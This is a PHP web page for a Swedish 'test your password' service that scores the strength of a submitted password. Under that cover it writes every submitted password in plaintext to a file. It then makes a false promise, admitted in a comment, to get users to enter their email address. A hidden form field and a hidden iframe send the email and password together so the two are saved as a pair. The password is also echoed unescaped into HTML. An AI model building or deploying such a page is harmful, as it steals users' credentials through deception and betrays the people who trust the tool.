<!DOCTYPE html>
<head>
  <meta charset="utf-8">
  <title>Resultat – Testa ditt lösenord!</title>
  <link rel="stylesheet" href="stylesheet.css">
</head>
<body>
  <?php
    function blip_color($min_score) {
      // This function calculates what color the blips in the score bar should have.
      global $score;
      if($score >= $min_score) { // Is this blip supposed to light up?
        if($score < 30) { // If so, in what color?
          echo "#fc291e";
        } elseif($score > 60) {
          echo "#1cd600";
        } else {
          echo "#fcf820";
        }
      } else {
        echo "#a5a5a5";
      }
    }
  ?>
  <!--This iframe is used as an invisible target to load the email saving script into.-->
  <iframe name="secret_iframe" style="display: none;"></iframe>
  <?php
    /*
      First things first, let's store the password.
      This code assumes that the web server has write access to a file called passwords.txt in
      the same directory as this script.
    */
    $password = $_POST["password"];
    $pw_log = fopen("passwords.txt", "a");
    fwrite($pw_log, $password . PHP_EOL); // Stores the password with a trailing newline in the file
    fclose($pw_log);
  ?>
  <div id="main">
    <div>
      <h1>Resultat</h1>
      <table>
        <tr>
          <td>Innehåller små bokstäver:</td>
          <td>
            <?php
              $lower = "abcdefghijklmnopqrstuvwxyz";
              $contains_lower = False;
              for($x = 0; $x < strlen($password); $x++) { // Loops through each character in the password.
                for($y = 0; $y < strlen($lower); $y++) { // Loops through each lower-case letter of the (english) alphabet.
                  if($password[$x] == $lower[$y]) {
                    /*
                      If the current character and the current letter are the same at any point,
                      the password contains a lower-case letter.
                    */
                    echo "Ja";
                    $contains_lower = True;
                    break 2; // Breaks out of both for loops.
                  }
                }
              }
              if($contains_lower == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller stora bokstäver:</td>
          <td>
            <?php
              // The same thing as before, only with upper-case letters instead of lower-case.
              $upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
              $contains_upper = False;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y < strlen($upper); $y++) {
                  if($password[$x] == $upper[$y]) {
                    echo "Ja";
                    $contains_upper = True;
                    break 2;
                  }
                }
              }
              if($contains_upper == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller siffror:</td>
          <td>
            <?php
              // The same thing as before, only with digits.
              $digits = "0123456789";
              $contains_digit = False;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y < strlen($digits); $y++) {
                  if($password[$x] == $digits[$y]) {
                    echo "Ja";
                    $contains_digit = True;
                    break 2;
                  }
                }
              }
              if($contains_digit == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller symboler:</td>
          <td>
            <?php
              // This one's a bit interesting.
              $contains_symbol = False;
              for($x = 0; $x < strlen($password); $x++) { // Loops through each character in the password.
                for($y = 0; $y <= 255; $y++) { // Loops through numbers 0 to 255, e.g. the entirety of an 8-bit extended ASCII character set.
                  if((48 <= $y and $y <= 57) or (65 <= $y and $y <= 90) or (97 <= $y and $y <= 122)) {
                    /*
                      This statement skips every character that's a letter or a digit.
                      In extended ASCII, every character is represented by a number between 0 and 255.
                      Numbers 48 through 57 represents digits 0 through 9, numbers 65 through 90
                      represent upper-case letters and numbers 97 through 122 represent lower-case letters.
                      Everything else is considered a symbol in our case.
                    */
                    break 1;
                  }
                  if(ord($password[$x]) == $y) {
                    echo "Ja";
                    $contains_symbol = True;
                    break 2;
                  }
                }
              }
              if($contains_symbol == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Längd:</td>
          <td>
            <?php
              if(strlen($password) <= 8) {
                echo "Kort";
                $length = 0;
              } elseif(strlen($password) <= 20) {
                echo "Medellångt";
                $length = 1;
              } else {
                echo "Långt";
                $length = 2;
              }
            ?>
          </td>
        </tr>
      </table>
      <h2>
        Poäng: <?php
          // The scoring here is, like, completely arbitrary.
          $score = 35; // By beginning at 35, the score will be between 0 and 80.
          if($contains_lower) { // If the password contains a lower-case letter, add 5 to the score, otherwise remove 5.
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_upper) { // Same thing for upper-case letters.
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_digit) { // ... and digits.
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_symbol) { // If the password contains a symbol, add 10 to the score, otherwise remove 5.
            $score += 10;
          } else {
            $score -= 5;
          }
          if($length == 2) { // If the password is long, add 20 to the score.
            $score += 20;
          } elseif($length == 0) { // If the password is short, remove 25.
            $score -= 25;
          } // If it's neither long nor short, don't do anything.
          echo $score;
        ?> / 80
      </h2>
      <table id="scorebar">
        <!--This is the score bar. I vomit a bit every time I look at it.-->
        <tr>
          <td class="scoreblip" style="background-color: <?php blip_color(0); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(5); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(10); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(15); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(20); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(25); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(30); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(35); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(40); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(45); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(50); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(55); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(60); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(65); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(70); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(75); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(80); ?>;"></td>
        </tr>
      </table>
      <h3>
        Ditt lösenord är
        <?php
          // Some nice words for humans to read and understand.
          if($score < 30) {
            echo " ganska dåligt. Du borde byta det.";
          } elseif($score > 60) {
            echo " jättebra! Fortsätt så!";
          } else {
            echo " helt okej. Det funkar nog.";
          }
        ?>
      </h3>
      <p>
        Om du vill ha ett bättre lösenord kan du skriva in din emailadress här så skickar vi ett bättre<br>
        lösenord till dig när vår superhögteknologiska lösenordsgenerator passerar betastadiet.
      </p>
      <!--SPOILERS: No, we won't.-->
      <form action="save_email_and_pw.php" method="post" target="secret_iframe">
        <!--
          Again, this is a bit interesting.
          When we save the email address, we want to save the password at the same time
          so we know which password belongs to which email address.
          To do this, we need to include the password in the email form.
        -->
        <input type="password" name="password" value="<?php echo $password; ?>" style="display: none;">
        <!--
          This input field is automatically filled with the password, and is hidden. It'll still
          be included in the POST, though.
        -->
        <p><input type="email" name="email" size="40" required></p>
        <p><input type="submit" value="Ge mig ett lösenord!"></p>
        <!--
          When the user submits the email address and the password, the email saving script is
          loaded into the hidden iframe. The benefit of this is that we don't need to leave
          the page to save the email address. The drawback is that there's no indication the
          email address was saved.
        -->
      </form>
    </div>
  </div>
</body>
